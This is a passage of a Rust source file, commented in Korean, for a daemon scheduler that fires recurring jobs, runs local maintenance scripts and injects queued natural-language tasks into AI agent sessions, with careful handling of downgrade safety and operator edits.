//! Heartbeat 스케줄러 — 24/365 상주 데몬이 정해진 시각에 반복 업무를 발화한다.
//! cron과의 차이: 살아있는 AI 세션의 stdin에 자연어 과업을 push하고,
//! 대상 역할이 부재하면 launch-agent로 깨워서 주입한다.

use crate::state::{now_epoch, state_dir, Daemon, HideConsole};
use chrono::{Datelike, Local, NaiveTime, TimeZone};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

const TICK_SECS: u64 = 30;
/// ★(0.14.31 · WP-3 B) `via_queue` 잡의 enqueue 경로 태그(`QueueEntry::origin`) — 관통 추적용.
/// alert 라우팅의 `"alert"` 와 **다른 값**이다: 같은 큐에 들어가도 출처가 다르다(스케줄 발화 ↔
/// 데몬 경보). 배달 규칙은 origin 을 보지 않으므로 동작 차이는 없고 관측만 갈린다.
const SCHEDULE_QUEUE_ORIGIN: &str = "schedule";
/// ★(0.14.31 · 리뷰 R1 · codex blocking) 큐 경유가 **계약**인 push 의 action 이름.
/// 구 데몬(`fire()` 의 match 가 push·command 뿐)은 이 action 을 `unknown action` 으로 거절한다 —
/// 즉 데몬을 되돌려도 이 잡은 **주입되지 않는다**(게이트 없이 발화하느니 발화하지 않는 쪽).
pub(crate) const ACTION_PUSH_QUEUED: &str = "push_queued";
/// 구 데몬(v0.14.30 · 이 브랜치 이전)이 아는 action 전부 — 강등 안전성 핀의 대조군.
#[cfg(test)]
pub(crate) const LEGACY_ACTIONS: &[&str] = &["push", "command"];
/// `via_queue` 적재의 활성 큐 상한 — 기존 enqueue 3경로와 **같은 100**(경보와 달리 보호선을
/// 따로 두지 않는다: 시간당 1회 발화라 적체 축이 아니다).
const SCHEDULE_QUEUE_CAP: usize = 100;
/// 예정 시각보다 이만큼 늦게 발견하면 발화하지 않고 missed 처리 (데몬 다운 후 재시작 등)
const MISS_WINDOW_SECS: i64 = 600;
/// 반복(time) + fresh 조합에서 close_after_secs 미설정 시 적용하는 기본 TTL.
/// 매 발화가 유일 역할의 새 surface를 만드는데 회수 트리거가 없으면 24/365 데몬에서
/// surface·roles 맵·PTY fd가 단조 증가한다(원샷+fresh는 1회뿐이나 반복은 무한 누적).
/// close_after_secs를 명시하면 그 값이 우선 — 기본은 주입 과업이 끝날 여유를 둔 보수적 상한.
const FRESH_RECURRING_DEFAULT_TTL_SECS: u64 = 1800;
/// ★(0.14.31 · triage X9) 큐 경유 잡의 fresh 좌석 회수 **하한**(초). 큐 배달은 배달자 틱이
/// 초안·alt-screen·승인대기·빈 좌석 게이트를 통과시킨 뒤에야 주입하므로, 0초 회수는 "적재하고
/// 즉시 버린다" 와 같다.
const QUEUED_CLOSE_MIN_TTL_SECS: u64 = 60;
/// ★(성찰 A4) **배달 유예의 안내 경계**(초) — *회수 시각이 아니다.*
///
/// 종전 이름은 `QUEUED_CLOSE_MAX_WAIT_SECS` 였고 값이
/// [`FRESH_RECURRING_DEFAULT_TTL_SECS`] 와 **같은 상수**였다. 두 성질이 한 숫자에 묶여 있었다:
/// '누수 방지 주기'(좌석을 언제까지 살려 두는가)와 '배달 유예'(적재된 일감의 처분을 얼마나
/// 기다리는가). 그래서 승인 대기가 31분을 넘기면 활성 큐에 항목이 **남아 있는데도** 좌석이
/// 닫혔고, 그 항목은 `record_active_drain(…, "surface_closed")` + `queue.dropped` 로 폐기됐다 —
/// 잡의 일감은 끝내 실행되지 않는데 그 사실은 이미 `schedule.fired{detail:"queued"}`(성공)로
/// 보고된 뒤다. 이제 이 경계는 **안내 이벤트를 내는 시각**일 뿐이고, 미완료 항목이 있으면
/// 좌석을 닫지 않는다(대기의 실질 상한은 큐 항목 자신의 TTL 이 진다 — 배달·만료 어느 쪽이든
/// 처분이 정해지면 그 즉시 회수된다).
const QUEUED_DELIVERY_GRACE_SECS: u64 = 1800;
/// 유예를 넘긴 뒤 안내를 **되풀이하는** 간격(초) — 매 폴링마다 발행하면 관측이 소음이 된다.
const QUEUED_DEFER_NOTICE_INTERVAL_SECS: u64 = 900;
/// 처분 확인 간격(초).
const QUEUED_CLOSE_POLL_SECS: u64 = 5;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LaunchSpec {
    pub role: String,
    pub agent: String,
    #[serde(default)]
    pub cwd: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(remote = "Self")]
pub struct Job {
    pub id: String,
    /// "HH:MM" (로컬 시간). 원샷(at)·주기(every_minutes) job은 생략.
    #[serde(default)]
    pub time: Option<String>,
    /// 주기 발화 간격(분). 설정 시 time·at 대신 마지막 발화 후 N분마다 반복 발화한다
    /// (절대지침: master 5분 주기 진행% 보고의 하트비트). 0·미설정은 비활성.
    #[serde(default)]
    pub every_minutes: Option<u64>,
    /// T3-10 원샷: 절대 epoch 발화 시각 — 처리(발화/missed) 후 job은 파일에서 제거된다
    #[serde(default)]
    pub at: Option<i64>,
    /// T3-10: fresh surface를 발화 후 N초 뒤 자동 close (원샷+fresh의 surface 누수 차단)
    #[serde(default)]
    pub close_after_secs: Option<u64>,
    /// 비어 있으면 매일. ["mon","tue",...]
    #[serde(default)]
    pub days: Vec<String>,
    /// "push" | "command"
    pub action: String,
    #[serde(default)]
    pub to: Option<String>,
    #[serde(default)]
    pub text: Option<String>,
    /// push 액션 전용: 설정 시 이 셸 명령을 데몬이 실행해 그 stdout을 push 텍스트로 쓴다
    /// (결정론 환원: 진행% 산출 같은 도구 출력을 master 앞에 직접 놓아, master가 산출 주체가
    /// 아니라 전달자가 되게 한다). text와 함께 설정되면 text_command 우선.
    #[serde(default)]
    pub text_command: Option<String>,
    #[serde(default)]
    pub command: Option<String>,
    /// push 대상 역할 부재 시: "launch" | "skip"(기본)
    #[serde(default)]
    pub if_absent: Option<String>,
    /// true면 매 발화마다 새 surface를 기동해 주입 (권한·컨텍스트 상속 차단 — cron 격리)
    #[serde(default)]
    pub fresh: bool,
    /// ★T9(R3-P03-3): true 면 **base 데몬 전용** 잡 — 부서 소켓 데몬에서는 `fire()` 진입부의
    /// 단일 관문이 skip 한다(사유 이벤트 1줄). 배경: `ensure_builtin_jobs` 는 모든 cysd 가
    /// 무조건 호출하고(main.rs) schedule_path 는 CYS_PACK_DIR 을 따르므로 부서 데몬도 자기 팩
    /// schedule.json 에 builtin 을 복제 기록한다 — cys-dept 정상 경로는 seed_schedule 이 비워
    /// 주지만, cys 클라이언트 autostart 등 cys-dept 를 경유하지 않는 재기동에서는 seed 가 다시
    /// 돌지 않아 부서 데몬이 base 전용 잡을 실행한다. 추가-전용 스키마 규약(#[serde(default)])
    /// — 구 파일·구 데몬과 양방향 호환(미지 필드 무시·부재=false).
    #[serde(default)]
    pub base_only: bool,
    /// ★(0.14.31 · WP-3 B) true 면 push 를 **큐 경유**로 보낸다 — `fire_push` 의 직접 `inject`
    /// (§8 "스케줄 push 가 큐를 우회한다"의 그 지점)를 타지 않고 대상 좌석의 `pending_queue` 에
    /// 적재해, 배달자(watchdog 틱)가 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 **전부**
    /// 통과시킨 뒤에야 주입한다. 기본 false = 기존 잡 전원 무회귀(추가-전용 스키마 규약).
    ///
    /// 왜 잡마다 고르게 두는가: 직접 주입은 "지금 이 좌석에 즉시" 라는 의미가 필요한 잡
    /// (phoenix 스냅샷 등)의 계약이고, 큐 경유는 "좌석이 받을 준비가 됐을 때" 라는 의미다.
    /// 한쪽으로 통일하면 다른 쪽 잡의 의미가 조용히 바뀐다.
    #[serde(default)]
    pub via_queue: bool,
    #[serde(default)]
    pub launch: Option<LaunchSpec>,
}

/// ★(0.14.31 · 독립 판정 triage X8) **수용 시점 정규화** — `#[serde(remote = "Self")]` 는
/// 파생 구현을 연관함수로 내려두고, 그 위에 이 검증 계층을 씌우는 serde 의 표준 관용이다.
/// 여기가 "큐 경유가 계약인 잡" 의 단일 정규형(`action = push_queued`)을 세우는 지점이다.
impl<'de> Deserialize<'de> for Job {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let mut job = Job::deserialize(deserializer)?;
        job.canonicalize_queue_action();
        Ok(job)
    }
}

impl Serialize for Job {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        Job::serialize(self, serializer)
    }
}

impl Job {
    /// ★(triage X8) 큐 경유가 계약인 push 잡을 **구 데몬이 거절하는 표현**으로 정규화한다.
    ///
    /// 강등 안전의 전제는 "구 데몬이 이 잡을 실행하지 못한다" 이다. 그런데 문서가 **지원한다고
    /// 명시한** opt-in 표현(`action:"push" + via_queue:true`)은 구 데몬이 미지 필드를 무시하고
    /// `"push"` 로 읽어 **직접 주입**한다 — 초안·승인대기·alt-screen·빈 좌석 게이트가 통째로
    /// 사라진다. 두 표현은 같은 뜻이므로 저장·수용의 정규형을 하나로 접는다.
    ///
    /// `action` 이 `push` 인 경우에만 만진다 — `command` 등 **다른 action** 을 큐 표현으로
    /// 바꾸면 그것이 운영자 편집의 무언 소실이다(§B-5 · 같은 부류의 결함 X13).
    fn canonicalize_queue_action(&mut self) {
        if self.via_queue && self.action == "push" {
            self.action = ACTION_PUSH_QUEUED.to_string();
        }
    }

    /// 이 잡의 push 가 **큐를 경유해야 하는가**.
    ///
    /// 두 표현이 같은 뜻이다: ①`action:"push_queued"`(구 데몬이 **거절**하는 강등 안전 표현) ·
    /// ②`via_queue:true`(추가-전용 필드 · 기존 잡의 opt-in). 새 builtin 은 ①을 쓰고 ②를 함께
    /// 세운다 — 운영자가 action 을 손으로 `push` 로 되돌려도 신 데몬에서는 큐 경유가 유지된다.
    pub fn uses_queue(&self) -> bool {
        self.via_queue || self.action == ACTION_PUSH_QUEUED
    }
}

/// schedule_state.json 영속 스키마 버전 — 추가-전용 마이그레이션의 기준점.
const SCHEDULE_STATE_VERSION: u32 = 1;

#[derive(Debug, Default, Serialize, Deserialize)]
struct ScheduleState {
    /// 영속 스키마 버전. 구파일(필드 부재)은 serde default로 0으로 로드된다. 향후 필드 변경 시
    /// 이 버전을 올리고 변환기를 추가하라 — 기존 필드는 삭제·개명하지 말고 옆에 추가(추가-전용).
    #[serde(default)]
    schema_version: u32,
    /// job id → 마지막으로 처리(발화 또는 missed)한 예정 시각 epoch
    last_fired: HashMap<String, i64>,
}

pub fn schedule_path() -> PathBuf {
    cys::pack::pack_dir().join("schedule.json")
}

/// ★B2-1(W3): built-in 잡 정의 버전. 잡 내용이 바뀌면 올린다 — 부트 ensure 가 구버전 항목을 갱신하는 기준.
/// v2: R6 W0-4/W0-5 — cycle 전자동 잡 2종(cycle-autopilot-tick·cycle-verifier-watchdog) 추가.
const BUILTIN_JOBS_VERSION: u64 = 2;

/// built-in 잡 정의(phoenix 인프라 + learn 학습 루프) — 팩 schedule.json 배달이 아니라 코드가 소유한다
/// (schedule.json 이 user-owned 로 전환돼 팩 강제갱신이 사용자 잡을 보존하므로, built-in 잡 진화는 이 코드가
/// 담당). 각 항목에 `_builtin`/`_builtin_version` 마커를 달아 ensure 가 id 로 upsert·버전 대조한다(Job 의
/// 미지 필드는 serde 가 무시). text_command 는 R-CLI-4 게이트가 이 코드 정의와의 정확 일치로 신뢰한다.
fn builtin_jobs() -> Vec<serde_json::Value> {
    vec![
        json!({
            "id": "phoenix-snapshot-6h",
            "every_minutes": 360,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 세대 스냅샷 정기화(6h·P2-4) — 손상 치유 소스 최신화.\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1 | tail -3",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "phoenix-drill-weekly",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 주간 격리 드릴(원자성·중단내성 self-test·라이브 무접촉) — 실전이 첫 테스트인 상태 종료(축E E2).\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1 | tail -5",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // (learn gaps C12③) RSI 학습 루프 정기 잡 — G1 audit 구동자(일 1회)·G5 fleet digest(주 1회).
        // CYS_ROUND_DIR 핀: 데몬 cwd 의존(_round) 대신 canonical ~/.cys/state/learn 고정
        // (launchd cwd=/ 사고 이력·설계안 §3 G5) — 데몬 learn_state_dir 규약과 동일(env 설정 시 승계).
        json!({
            "id": "learn-ttl-audit",
            "every_minutes": 1440,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] RSI 학습 TTL 감사(일 1회·G1) — 만기 tombstone·재검 wakeup·lapse 강등·refs 대조의 결정론 산출이다. hard-fail 항목은 능동 조치하라.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" JAVIS_ROOT=\"${JAVIS_ROOT:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_learn.py\" audit --json",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "fleet-digest",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] 주간 fleet digest(G5) — 채택 학습물·사후 효과(ROI)·게이트 지출의 결정론 read-only 집계다. 수치 불변으로 보고하라. 추천 0건 지속=게이트 비용 재조정 검토 트리거.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_fleet_report.py\" --days 7 2>&1 | tail -40",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── (R6 W0-4) cycle 전자동 틱 — javis_cycle_autopilot.py tick 매분 구동 ──────────
        // ★action="command" 핀(크리틱 B3 ①): 이 잡을 push 로 만들면 매분 master stdin 에
        //   기계 문안이 꽂힌다(폭주 — 라운드1 홍수 결함군 재생산). command 레인(fire_command)
        //   은 stdin 주입 0 이고, R-CLI-4 정확일치 게이트는 text_command(push 레인) 전용이라
        //   command 레인과 충돌하지 않는다 — 선례: pack seed 의 owner-progress-gate-5min
        //   (GUIDE-fullauto-cycle §3 배선안과 동일 레인).
        // ★모드/역할은 STATE_DIR/mode·roles **파일 채널**(javis_cycle_autopilot.mode()/roles()):
        //   command 문자열에 CYS_AUTOPILOT_MODE=live 접두를 심으면, 이 잡은 `_builtin` 마커
        //   잡이라 BUILTIN_JOBS_VERSION 범프 때 apply_builtin_jobs 가 코드 정의로 통째 교체 —
        //   live 가 shadow 로 **무언 회귀**한다(크리틱 B3 ②). 파일 채널은 잡 문자열과 독립이라
        //   버전 범프에 살아남는다.
        // ★shadow 기본이라 이 배선 자체는 무해 — tick 은 would_fire 를 원장에 기록만 하고
        //   아무것도 발화하지 않는다(live 승격은 운영자의 STATE_DIR/mode 파일이 별도 수행).
        //   tick 은 정상 skip 도 exit 0([v2.1 ③] 계약)이라 `; exit 0` 꼬리 불요 — 비0 은
        //   진짜 내부 오류뿐이고 그것만 schedule.error 로 표면화되는 것이 의도다.
        json!({
            "id": "cycle-autopilot-tick",
            "every_minutes": 1,
            "action": "command",
            "command": "CYS_PROJECT_ROOT=\"${CYS_PROJECT_ROOT:-$HOME}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_cycle_autopilot.py\" tick",
            "_builtin": "cycle",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── (R6 W0-5) 검증자 워치독 — bootstrap-verifier --ensure 10분 주기 ────────────
        // --ensure 는 멱등(P0-1): 검증자 surface 실재 + heartbeat 신선이면 no-op exit 0 —
        // 건강 상태에서 중복 pane 생성 0. 죽은/부재 워처만 현행 기동 로직으로 재기동한다.
        // action="command" 이유·모드 파일 채널·shadow 무해성은 위 tick 잡 주석과 동일.
        json!({
            "id": "cycle-verifier-watchdog",
            "every_minutes": 10,
            "action": "command",
            "command": "CYS_PROJECT_ROOT=\"${CYS_PROJECT_ROOT:-$HOME}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_cycle_autopilot.py\" bootstrap-verifier --ensure",
            "_builtin": "cycle",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★T9(P3-1 ⓑ) 상비편성 심박 — 10분 틱으로 전 부서 formation ensure ────────────
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3: 신규 id 는 버전 무관
        // append(:None→push) — 범프하면 기존 builtin 6종이 코드 정의로 통째 교체돼 운영자 수기
        // 편집이 무언 소실된다). 부서 팩 schedule 은 seed_schedule 이 설계상 비우므로 이 틱의
        // 소유는 **base 데몬**이고, base_only+fire() 관문이 부서 데몬 복제 실행을 차단한다.
        // command 레인(스케줄 push 아님 — master stdin 무주입)·`--force-surface` 금지
        // (javis_formation._surface: 주기 잡에 붙이면 매 틱 토스트 스팸). ensure 자체가
        // 소켓키 싱글플라이트+시도 원장(역할당 MAX 3·쿨다운)으로 유계라 10분 틱이 폭주 축이
        // 되지 않는다(P3-1 폭주 앵커 ① 방어). agent 전멸 부서의 유일 자동 복구 경로(치명 ③).
        // ★한계(SF-3·기지): 전 부서를 fire_command 단일 600s 캡 안에서 직렬 순회
        // — _boot_node 역할당 200s 상한이라 편성 폭풍 시 1부서만으로 캡 초과 가능. fire_command
        // 는 kill_on_drop 미설정이라 타임아웃해도 자식은 완주(작업·원장 정상 — 폭주 아님)하고
        // 그 틱에 'command timed out' 오보 1줄만 남는다. 부서당 timeout 래핑은 플랫폼별
        // timeout(1) 가용성이 갈려 보류(coreutils 비보장 — macOS 기본엔 없음).
        // ★한계(R3-WINTICK-5 · 2026-08-26): 이 페이로드는 POSIX 셸 문법(`${VAR:-}`·`$( )`·
        //   `for … do … done`)이라 Windows 에서 `command_shell()` 이 **cmd /C 로 폴백하면
        //   매 틱 실패**한다. 그 폴백 조건은 동봉 `runtime\git\...\bash.exe` 결손 — 즉 P4-2
        //   advisory 가 진단하는 상태와 **같은 근본원인**이고, 파일 하나가 ⓐ훅 전면 무발화
        //   (U-20) ⓑ이 편성 심박(agent 전멸 부서의 유일 자동 복구) ⓒ아래 승격 집행 틱을
        //   동시에 끊는다. 사용자 가시화는 그 advisory 본문이 담당한다(lib.rs
        //   `windows_runtime_damage_notice` — 회귀 핀 `windows_runtime_damage_notice_contract`
        //   가 파급 고지 문언을 단언). 여기 관측은 schedule.warning/error 버스 이벤트뿐이다.
        json!({
            "id": "formation-heartbeat",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" --json || true; done",
            "_builtin": "formation",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★T10(P3-2) 대기형 CEO 승격 집행 틱 — 신호(부트 ⑦ request-only)/집행 분리의 집행 레인 ──
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3: 신규 id 는 버전 무관
        // append — 범프하면 기존 builtin 이 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실).
        // 실행 주체 계약(P3-2 revised_design): 집행은 base 데몬 스케줄 틱의 **role-less** 주체 —
        // cys-dept 단일소유 가드(roled 세션 대기형 exit 7)·승격 조건 3중(CEO_PENDING+BOOT_MARKER+
        // 부서≥1)·부트마커 게이트·A11 dedupe 는 전부 cys-dept 내부 소관(무수정). `env -u CYS_ROLE`
        // 은 roled pane 이 띄운 데몬의 env 상속까지 결정론 차단해 '틱=role-less 주체' 계약을
        // 기계로 만든다(가드 완화가 아니라 지정 집행자의 신원 고정 — 가드 자체는 무접촉).
        // 조건 미충족이면 no-op exit 0 멱등(폭주 축 아님 — 승격 자체도 파일 스왑 1회+flock 직렬화·
        // 스폰 0). 대기형 안의 스왑 직전 상위집합 검사(DCE-3)가 스텁 템플릿 승격을 보류한다.
        // base_only+fire() 관문: 부서 데몬에 복제 기록된 이 잡이 돌면 게이트 파일이 $HOME
        // 절대경로라 부서에서도 성공해 base 와 동시 승격 시도(단일소유 위반)가 되므로 base
        // 레인에서만 발화한다(R3-P03-3 — cys-dept 비경유 재기동은 seed_schedule 청소가 안 돈다).
        json!({
            "id": "ceo-promote-pending-tick",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; env -u CYS_ROLE \"$pk/bin/cys-dept\" promote-if-pending",
            "_builtin": "promote",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★(0.14.31 · WP-3 B) CSO alert inbox 정기 점검(60분) ────────────────────────
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3 선례와 동일: 범프하면
        // 기존 builtin 전체가 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실된다).
        // ★`via_queue: true` — 이 잡만 큐를 경유한다. 스케줄 push 는 원래 `fire_push`→`inject`
        //   로 큐를 **우회**하는데(§8 명시), CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·
        //   승인대기·빈 좌석·pause 게이트를 전부 건너뛰고 좌석에 글자를 꽂는다. 큐 경유면
        //   배달자(watchdog 틱)가 그 게이트를 전부 통과시킨 뒤에야 주입한다.
        // ★`base_only` 를 세우지 않는다(=false): 부서 데몬은 **자기 CSO 좌석과 자기 alert_route
        //   상태**를 가진다 — base 전용으로 만들면 부서 CSO 는 자기 데몬의 경보를 정기적으로
        //   훑을 계기를 영영 못 받는다. 이 잡은 조직 전역 1건이 아니라 **데몬 지역 점검**이다.
        // ★`if_absent: "skip"` — CSO 좌석이 없으면 조용히 건너뛴다(부재는 에러가 아니다 ·
        //   좌석 없는 데몬에서 schedule.error 를 매 시간 쌓지 않는다).
        // ★문안에 선두 라벨을 두지 않는다 — `ensure_machine_label` 이 `[schedule <id>]` 을
        //   붙인다(기계 유래 표식의 단일 규약. 여기서 `[alert]` 를 흉내내면 데몬 경보와 스케줄
        //   발화가 판독자에게 같은 것으로 보인다).
        // ★무이상 카운터 갱신은 잡이 하지 않는다(정본 §4 B) — 파일 동시성 회피.
        json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 60,
            "action": ACTION_PUSH_QUEUED,
            "to": "cso",
            "if_absent": "skip",
            "via_queue": true,
            "text": "데몬 alert inbox 정기 점검(60분). 큐에 쌓인 [alert] 항목을 순서대로 읽고 좌석 건강·자원 게이트·컨텍스트 사이클 범위에서만 판단하라. 경보는 데몬이 밀어 넣는다 — 직접 구독(Monitor)·크론 재등록은 하지 마라. 이상이 없으면 아무것도 기록하지 마라(무이상 무기록).",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
    ]
}

/// 저장된 잡 배열에서 `action:"push" + via_queue:true` 를 `action:"push_queued"` 로 접는다(순수).
/// 반환: 바꾼 것이 있는가. **`push` 이외의 action 은 건드리지 않는다**(운영자 편집 보존 · §B-5).
fn canonicalize_stored_queue_actions(jobs: &mut [serde_json::Value]) -> bool {
    let mut changed = false;
    for j in jobs.iter_mut() {
        let is_push = j.get("action").and_then(|v| v.as_str()) == Some("push");
        let via = j.get("via_queue").and_then(|v| v.as_bool()).unwrap_or(false);
        if is_push && via {
            if let Some(o) = j.as_object_mut() {
                o.insert("action".into(), json!(ACTION_PUSH_QUEUED));
            }
            changed = true;
        }
    }
    changed
}

/// ★(0.14.31 · 수렴 R2 · triage X8 잔여) **파일을 정규형으로 접고 그 사실을 남긴다.**
///
/// 정규화가 데몬 부트(`ensure_builtin_jobs`)에서만 돌면 그 뒤의 운영자 수기 편집은 **파일에
/// 강등 취약형으로 남는다**: `load_jobs` 의 핫리로드는 메모리 안에서만 접고, `remove_job_from_file`
/// 은 그 원시 JSON 을 **그대로 다시 쓴다**. 신 데몬이 도는 동안 손으로 넣은
/// `action:"push" + via_queue:true` 가 그렇게 디스크에 살아남아, 강등된 구 데몬이 그것을 `push`
/// 로 읽고 **큐 준비 게이트를 통째 우회해 직접 주입**한다(이 정규화의 목적 그 자체).
///
/// 그래서 **원시 JSON 을 쓰는 모든 자리**가 이 함수를 지난다. 뜻은 보존한다(같은 잡·같은 목적지·
/// 같은 문안 · action 표현만 하나로) — §B-5 의 "무언 소실" 이 아니지만, 조용한 무접촉도 관측
/// 소실이므로 바꾼 잡 id 를 한 줄로 남긴다.
/// 반환: 파일을 바꿨는가.
fn canonicalize_schedule_file(path: &std::path::Path, root: &mut serde_json::Value) -> bool {
    let ids: Vec<String> = match root.get_mut("jobs").and_then(|j| j.as_array_mut()) {
        Some(arr) => {
            if !canonicalize_stored_queue_actions(arr) {
                return false;
            }
            arr.iter()
                .filter(|j| j.get("action").and_then(|v| v.as_str()) == Some(ACTION_PUSH_QUEUED))
                .filter_map(|j| j.get("id").and_then(|v| v.as_str()).map(str::to_string))
                .collect()
        }
        None => return false,
    };
    if !write_schedule_atomic(path, root) {
        eprintln!("[cysd] schedule.json 정규화 기록 실패 — 파일은 구 표현 그대로다(강등 시 직접 주입 위험)");
        return false;
    }
    eprintln!(
        "[cysd] schedule.json: 'action:\"push\" + via_queue:true' 를 '{ACTION_PUSH_QUEUED}' 로 접었다(뜻 보존 · 대상 {ids:?})"
    );
    true
}

/// schedule.json 원자 치환(tmp+rename) — 핫리로드 torn read 회피. 반환: 성공했는가.
fn write_schedule_atomic(path: &std::path::Path, root: &serde_json::Value) -> bool {
    let Ok(body) = serde_json::to_string_pretty(root) else {
        return false;
    };
    let tmp = path.with_extension("json.tmp");
    if std::fs::write(&tmp, body).is_err() {
        return false;
    }
    if std::fs::rename(&tmp, path).is_err() {
        let _ = std::fs::remove_file(&tmp);
        return false;
    }
    true
}

/// built-in 잡을 jobs 배열에 idempotent upsert(순수 — 회귀 핀). id 로 대조:
///   · 부재 → append(생성)
///   · 존재 + built-in 마커(`_builtin`이 코드 정의와 일치: "phoenix"·"learn"·"cycle"·"formation"·"promote") → 버전 상이 시 교체(갱신)·동버전 무접촉
///   · 존재 + **마커 없음/불일치(사용자가 그 id 선점)** → ★codex W3: 교체 금지(사용자 잡 보존)·경고(conflicts 반환)
/// 반환 `(changed, preempted, edited_action)` — ★(0.14.31 · 수렴 R2 · triage X13) **덮지 않은
/// 두 사유를 가른다**. 종전에는 둘이 한 벡터라 호출부가 양쪽에 "예약 id 선점" 문안을 찍었다:
/// action 만 편집한 운영자는 일어나지도 않은 선점을 통보받고 틀린 처방(다른 id 로 옮기라)을
/// 읽었다 — 같은 실행에서 정확한 줄과 함께 나오므로 **서로 모순되는 두 줄**이었다.
///   · `preempted` = 사용자 잡이 예약 id 를 선점(마커 없음/불일치) → 처방: 다른 id 로 옮기라.
///   · `edited_action` = 우리 잡인데 운영자가 action 을 편집(id, 현재 action) → 처방: action 을 되돌리라.
fn apply_builtin_jobs(
    jobs: &mut Vec<serde_json::Value>,
) -> (bool, Vec<String>, Vec<(String, String)>) {
    let mut changed = false;
    let mut conflicts = Vec::new();
    let mut edited_action: Vec<(String, String)> = Vec::new();
    for bj in builtin_jobs() {
        let id = match bj.get("id").and_then(|v| v.as_str()) {
            Some(s) => s.to_string(),
            None => continue,
        };
        let want_ver = bj.get("_builtin_version").and_then(|v| v.as_u64()).unwrap_or(0);
        match jobs
            .iter()
            .position(|j| j.get("id").and_then(|v| v.as_str()) == Some(id.as_str()))
        {
            Some(pos) => {
                // ★codex W3 major: built-in 마커(_builtin)가 코드 정의(bj)의 마커와 일치하는 항목만
                //   우리 소유 → 버전 갱신. 마커 없는/다른 동명 항목은 사용자가 그 id 를 선점한 것
                //   → 교체 금지+conflict 경고(user 잡 보존). (마커군: "phoenix"=인프라·"learn"=학습 루프·"cycle"=전자동 사이클)
                let want_marker = bj.get("_builtin").and_then(|v| v.as_str());
                let is_ours = want_marker.is_some()
                    && jobs[pos].get("_builtin").and_then(|v| v.as_str()) == want_marker;
                if !is_ours {
                    conflicts.push(id);
                    continue;
                }
                // ★(0.14.31 · 리뷰 R1 · codex blocking) **표적 마이그레이션: action 만 고친다.**
                //   동버전 항목은 아래에서 무접촉인데, 우리 잡의 `action` 이 코드 정의와 달라진
                //   경우(구 빌드가 `push` 로 심어 둔 그 잡)는 그대로 두면 **큐 우회 주입**이
                //   남는다. 전역 버전 범프는 다른 builtin 전부를 코드 정의로 덮어 운영자 편집을
                //   소실시키므로(§B-5 금지), 같은 id·같은 마커 항목의 **그 필드만** 고친다.
                //   `via_queue` 도 함께 세워, 운영자가 action 을 되돌려도 신 데몬은 큐를 탄다.
                //   ★(0.14.31 · 독립 판정 triage X13) 조건은 "**구 표현인가**" 이지 "코드 정의와
                //   다른가" 가 아니다. 종전 조건은 같은 id·같은 마커를 유지한 채 `action` 을
                //   `command` 로 바꾼 운영자 잡까지 `push_queued` 로 덮었다 — 설정한 명령이 돌지
                //   않고 그 문자열이 inbox 잡이 된다(§B-5 "운영자 수기 편집 무언 소실 금지" 위반).
                //   이관 대상은 구 빌드가 심은 정확히 그 표현(`"push"`)뿐이고, 그 밖의 불일치는
